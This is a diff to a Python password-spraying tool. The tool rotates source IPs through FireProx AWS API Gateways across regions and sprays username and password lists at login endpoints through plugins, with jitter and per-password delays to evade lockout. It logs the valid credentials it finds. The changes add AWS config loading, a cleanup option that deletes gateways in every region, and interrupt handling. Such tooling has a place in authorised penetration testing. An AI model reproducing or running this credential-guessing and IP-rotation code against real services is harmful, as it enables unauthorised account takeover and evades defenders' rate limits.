@@ -43,14 +43,33 @@ def main(args,pargs):
 	secret_access_key = args.secret_access_key
 	session_token = args.session_token
 	useragent_file = args.useragentfile
-	url = ""
 	delay = args.delay
 	outfile = args.outfile
 	passwordsperdelay = args.passwordsperdelay
 	jitter = args.jitter
 	jitter_min = args.jitter_min
 
-	# catch input exception conditions
+	# input exception handling
+	if args.config != None:
+		log_entry("Loading AWS configuration details from file: {}".format(args.config))
+		aws_dict = json.loads(open(args.config).read())
+		access_key = aws_dict['access_key']
+		secret_access_key = aws_dict['secret_access_key']
+		profile_name = aws_dict['profile_name']
+		session_token = aws_dict['session_token']
+
+	if access_key == None and secret_access_key == None and session_token == None and profile_name == None:
+		log_entry("No FireProx access arguments settings configured, add access keys/session token or fill out config file")
+		return
+
+	if args.clean:
+		clear_all_apis(access_key, secret_access_key, profile_name, session_token)
+		return
+	else:
+		if username_file == None or password_file == None:
+			log_entry("Plugin name, User file and password file must be provided")
+			return
+
 	if jitter_min is not None and jitter is None:
 		log_entry("--jitter flag must be set with --jitter-min flag")
 		return
@@ -58,7 +77,6 @@ def main(args,pargs):
 		log_entry("--jitter flag must be greater than --jitter-min flag")
 		return
 
-	# TODO: Add exception conditions for access_key/etc
 
 	pluginargs = {}
 	if len(pargs) % 2 == 1:
@@ -73,66 +91,79 @@ def main(args,pargs):
 	# Check with plugin to make sure it has the data that it needs
 	validator = importlib.import_module('plugins.{}'.format(plugin))
 	if getattr(validator,"validate",None) is not None:
-		valid,errormsg,url = validator.validate(pluginargs, args)
+		valid, errormsg, pluginargs = validator.validate(pluginargs, args)
 		if not valid:
 			log_entry(errormsg)
 			return
 	else:
 		log_entry("No validate function found for plugin: {}".format(plugin))
 
-	# Create lambdas based on thread count
-	apis = load_apis(access_key, secret_access_key, profile_name, session_token, thread_count, url)
+	# this is the original URL, NOT the fireproxy one. Don't use this in your sprays!
+	url = pluginargs['url']
 
-	# Print stats
-	display_stats()
+	try:
+		# Create lambdas based on thread count
+		apis = load_apis(access_key, secret_access_key, profile_name, session_token, thread_count, url)
 
-    #out_thread = threading.Thread(name="Thread-out", target=report, args=(out_q, output_file))
+		# Print stats
+		display_stats()
 
-	log_entry("Starting Spray...")
+	    #out_thread = threading.Thread(name="Thread-out", target=report, args=(out_q, output_file))
 
-	count = 0
-	passwords = load_file(password_file)
-	for password in passwords:
+		log_entry("Starting Spray...")
 
-		load_credentials(username_file, password, useragent_file)
+		count = 0
+		passwords = load_file(password_file)
+		for password in passwords:
 
-		# Start Spray
-		with ThreadPoolExecutor(max_workers=len(apis)) as executor:
-			for api_key in apis:
-				#log_entry('Launching spray using {}...'.format())
-				executor.submit(
-					spray_thread,
-					api_key = api_key,
-					api_dict = apis[api_key],
-					plugin = plugin,
-					jitter = jitter,
-					jitter_min = jitter_min
-				)
+			load_credentials(username_file, password, useragent_file)
 
-		count = count + 1
+			# Start Spray
+			with ThreadPoolExecutor(max_workers=len(apis)) as executor:
+				for api_key in apis:
+					#log_entry('Launching spray using {}...'.format())
+					executor.submit(
+						spray_thread,
+						api_key = api_key,
+						api_dict = apis[api_key],
+						plugin = plugin,
+						pluginargs = pluginargs,
+						jitter = jitter,
+						jitter_min = jitter_min
+					)
 
-		if delay == None or len(passwords) == 1 or password == passwords[len(passwords)-1]:
-			log_entry('Completed spray with password {} at {}'.format(password, datetime.datetime.utcnow()))
-			continue
-		elif count != passwordsperdelay:
-			log_entry('Completed spray with password {} at {}, moving on to next password...'.format(password, datetime.datetime.utcnow()))
-			continue
-		else:
-			log_entry('Completed spray with password {} at {}, sleeping for {} minutes before next password spray'.format(password, datetime.datetime.utcnow(), delay))
-			log_entry('Valid credentials discovered: {}'.format(len(results)))
-			for success in results:
-				log_entry('Valid: {}:{}'.format(success['username'], success['password']))
-			count = 0
-			time.sleep(delay * 60)
+			count = count + 1
 
-	done = True
+			if delay == None or len(passwords) == 1 or password == passwords[len(passwords)-1]:
+				log_entry('Completed spray with password {} at {}'.format(password, datetime.datetime.utcnow()))
+				continue
+			elif count != passwordsperdelay:
+				log_entry('Completed spray with password {} at {}, moving on to next password...'.format(password, datetime.datetime.utcnow()))
+				continue
+			else:
+				log_entry('Completed spray with password {} at {}, sleeping for {} minutes before next password spray'.format(password, datetime.datetime.utcnow(), delay))
+				log_entry('Valid credentials discovered: {}'.format(len(results)))
+				for success in results:
+					log_entry('Valid: {}:{}'.format(success['username'], success['password']))
+				count = 0
+				time.sleep(delay * 60)
 
-	# Capture duration
-	end_time = datetime.datetime.utcnow()
-	time_lapse = (end_time-start_time).total_seconds()
+		done = True
 
-	# Remove AWS resources
-	destroy_apis(access_key, secret_access_key, profile_name, session_token)
+		# Capture duration
+		end_time = datetime.datetime.utcnow()
+		time_lapse = (end_time-start_time).total_seconds()
+
+		# Remove AWS resources
+		destroy_apis(access_key, secret_access_key, profile_name, session_token)
+
+	except KeyboardInterrupt:
+		log_entry("KeyboardInterrupt detected, cleaning up APIs")
+		try:
+			destroy_apis(access_key, secret_access_key, profile_name, session_token)
+		except KeyboardInterrupt:
+			log_entry("Second KeyboardInterrupt detected, unable to clean up APIs :(")
+
 
 	# Print stats
 	display_stats(False)
@@ -142,6 +173,7 @@ def load_apis(access_key, secret_access_key, profile_name, session_token, thread
 	threads = thread_count
 
 	if thread_count > len(regions):
+		log_entry("Thread count over maximum, reducing to 15")
 		threads = len(regions)
 
 	log_entry('Creating {} API Gateways for {}'.format(threads, url))
@@ -150,7 +182,7 @@ def load_apis(access_key, secret_access_key, profile_name, session_token, thread
 
 	# slow but multithreading this causes errors in boto3 for some reason :(
 	for x in range(0,threads):
-		apis[regions[x]] = create_api(access_key, secret_access_key, profile_name,	session_token, regions[x], url)
+		apis[regions[x]] = create_api(access_key, secret_access_key, profile_name,	session_token, regions[x], url.strip())
 		log_entry('Created API - Region: {} ID: ({}) - {} => {}'.format(regions[x], apis[regions[x]]['api_gateway_id'], apis[regions[x]]['proxy_url'], url))
 
 	return apis
@@ -212,8 +244,34 @@ def destroy_apis(access_key, secret_access_key, profile_name, session_token):
 		fp.delete_api(args["api_id"])
 
 
-def spray_thread(api_key, api_dict, plugin, jitter=None, jitter_min=None):
+def clear_all_apis(access_key, secret_access_key, profile_name, session_token):
+
+	log_entry("Clearing APIs for all regions")
+	clear_count = 0
+
+	for region in regions:
+
+		args, help_str = get_fireprox_args(access_key, secret_access_key, profile_name, session_token, "list", region)
+		fp = FireProx(args, help_str)
+		active_apis = fp.list_api()
+		count = len(active_apis)
+		err = "skipping"
+		if count != 0:
+			err = "removing"
+		log_entry("Region: {}, found {} APIs configured, {}".format(region, count, err))
+
+		for api in active_apis:
+			if "fireprox" in api['name']:
+				fp.delete_api(api['id'])
+				clear_count += 1
+
+	log_entry("APIs removed: {}".format(clear_count))
+
+
+def spray_thread(api_key, api_dict, plugin, pluginargs, jitter=None, jitter_min=None):
+
 	global results
+
 	try:
 		plugin_authentiate = getattr(importlib.import_module('plugins.{}.{}'.format(plugin, plugin)), '{}_authenticate'.format(plugin))
 	except Exception as ex:
@@ -231,7 +289,7 @@ def spray_thread(api_key, api_dict, plugin, jitter=None, jitter_min=None):
 					jitter_min = 0
 				time.sleep(random.randint(jitter_min,jitter))
 
-			response = plugin_authentiate(api_dict['proxy_url'], cred['username'], cred['password'], cred['useragent'])
+			response = plugin_authentiate(api_dict['proxy_url'], cred['username'], cred['password'], cred['useragent'], pluginargs)
 
 			if not response['error']:
 				log_entry("{}: {}".format(api_key,response['output']), thread_region=api_key)
@@ -291,12 +349,12 @@ def log_entry(entry, thread_region=None):
 if __name__ == '__main__':
 
 	parser = argparse.ArgumentParser()
-	parser.add_argument('--plugin', help='Spray plugin', required=True)
-	parser.add_argument('-t', '--threads', type=int, default=1, help='Thread count (default: 1)')
-	parser.add_argument('-u', '--userfile', required=True, help='Username file')
-	parser.add_argument('-p', '--passwordfile', required=True, help='Password file')
+	parser.add_argument('--plugin', help='Spray plugin', default=None, required=False)
+	parser.add_argument('-u', '--userfile', default=None, required=False, help='Username file')
+	parser.add_argument('-p', '--passwordfile', default=None, required=False, help='Password file')
 	parser.add_argument('-a', '--useragentfile', required=False, help='Useragent file')
-	parser.add_argument('-o', '--outfile', default=None, required=False, help='Output file to write contents')
+	parser.add_argument('-o', '--outfile', default=None, required=False, help='Output file to write contents (omit extension)')
+	parser.add_argument('-t', '--threads', type=int, default=1, help='Thread count (default 1, max 15)')
 	parser.add_argument('-j', '--jitter', type=int, default=None, required=False, help='Jitter delay between requests in seconds (applies per-thread)')
 	parser.add_argument('-m', '--jitter_min', type=int, default=None, required=False, help='Minimum jitter time in seconds, defaults to 0')
 	parser.add_argument('-d', '--delay', type=int, required=False, help='Delay between unique passwords, in minutes')
@@ -305,6 +363,9 @@ if __name__ == '__main__':
 	parser.add_argument('--access_key', type=str, default=None, help='AWS Access Key')
 	parser.add_argument('--secret_access_key', type=str, default=None, help='AWS Secret Access Key')
 	parser.add_argument('--session_token', type=str, default=None, help='AWS Session Token')
+	parser.add_argument('--config', type=str, default=None, help='Authenticate to AWS using config file aws.config')
+	parser.add_argument('--clean', default=False, action="store_true", help='Clean up ALL AWS APIs from every region, warning irreversible')
+
 	args,pluginargs = parser.parse_known_args()
 
 	main(args,pluginargs)
